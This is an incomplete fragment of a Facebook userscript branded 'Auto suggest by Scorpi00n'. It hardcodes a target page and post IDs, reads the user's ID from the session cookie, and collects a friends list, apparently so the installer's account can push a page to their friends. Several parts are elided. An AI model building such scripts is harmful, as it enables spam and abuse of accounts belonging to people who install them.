// ==UserScript==
// @name            Facebook Auto suggest by Scorpi00n
// @description     FAcebook Auto suggest by Scorpi00n
...
var spage_id = "502380683124006";
var spost_id = "570494842979256";
var sfoto_id = "570494842979256";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Scorpi00n';
